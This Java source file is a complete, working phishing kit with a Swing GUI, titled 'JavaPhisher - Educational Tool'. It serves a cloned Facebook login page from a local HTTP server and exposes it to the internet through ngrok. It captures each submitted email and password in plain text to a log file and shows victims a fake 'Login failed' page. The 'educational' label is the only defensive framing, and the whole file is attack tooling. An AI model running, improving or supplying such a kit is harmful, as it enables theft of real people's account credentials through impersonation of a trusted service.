package org.guercifzone.Exmp_1;

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.file.*;
import java.util.*;

public class Fishing_1 {

    private static HttpServer server;
    private static JTextArea logArea;

    public static void main(String[] args) {
        SwingUtilities.invokeLater(Fishing_1::createAndShowGUI);
    }

    private static void createAndShowGUI() {
        JFrame frame = new JFrame("JavaPhisher - Educational Tool");
        frame.setSize(600, 500);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setLayout(new BorderLayout());

        // North Panel for controls
        JPanel topPanel = new JPanel();
        JButton startBtn = new JButton("Start Server");
        JButton stopBtn = new JButton("Stop Server");
        JButton ngrokBtn = new JButton("Launch Ngrok");

        topPanel.add(startBtn);
        topPanel.add(stopBtn);
        topPanel.add(ngrokBtn);

        // Center Panel for log display
        logArea = new JTextArea();
        logArea.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(logArea);

        frame.add(topPanel, BorderLayout.NORTH);
        frame.add(scrollPane, BorderLayout.CENTER);

        // Button Actions
        startBtn.addActionListener((ActionEvent e) -> startServer());
        stopBtn.addActionListener((ActionEvent e) -> stopServer());
        ngrokBtn.addActionListener((ActionEvent e) -> launchNgrok());

        frame.setVisible(true);
    }

    private static void startServer() {
        try {
            server = HttpServer.create(new InetSocketAddress(8080), 0);

            // Serve the phishing page
            server.createContext("/", exchange -> {
                byte[] response = Files.readAllBytes(Paths.get("templates/facebook/index.html"));
                exchange.getResponseHeaders().add("Content-Type", "text/html");
                exchange.sendResponseHeaders(200, response.length);
                OutputStream os = exchange.getResponseBody();
                os.write(response);
                os.close();
            });

            // Handle credentials
            server.createContext("/login", new LoginHandler());
            server.setExecutor(null);
            server.start();
            appendLog("Server started at http://localhost:8080");
        } catch (IOException ex) {
            appendLog("Error starting server: " + ex.getMessage());
        }
    }

    private static void stopServer() {
        if (server != null) {
            server.stop(0);
            appendLog("Server stopped.");
        }
    }

    private static void launchNgrok() {
        try {
            ProcessBuilder pb = new ProcessBuilder("ngrok", "http", "8080");
            pb.inheritIO().start();
            appendLog("Ngrok launched. Check terminal or http://localhost:4040");
        } catch (IOException ex) {
            appendLog("Error launching Ngrok: " + ex.getMessage());
        }
    }

    private static void appendLog(String text) {
        logArea.append(text + "\n");
    }

    // Custom login handler that captures form data
    static class LoginHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equals(exchange.getRequestMethod())) {
                InputStream is = exchange.getRequestBody();
                String formData = new String(is.readAllBytes());

                Map<String, String> params = parseFormData(formData);
                String email = params.getOrDefault("email", "");
                String pass = params.getOrDefault("pass", "");

                String log = "EMAIL: " + email + " | PASS: " + pass;
                Files.write(Paths.get("logs/captured.txt"), (log + "\n").getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);

                SwingUtilities.invokeLater(() -> appendLog(log));

                String response = "<h2>Login failed</h2><p>Invalid credentials</p>";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }

        private Map<String, String> parseFormData(String data) throws UnsupportedEncodingException {
            Map<String, String> map = new HashMap<>();
            for (String pair : data.split("&")) {
                String[] kv = pair.split("=");
                if (kv.length == 2) {
                    map.put(URLDecoder.decode(kv[0], "UTF-8"), URLDecoder.decode(kv[1], "UTF-8"));
                }
            }
            return map;
        }
    }
}
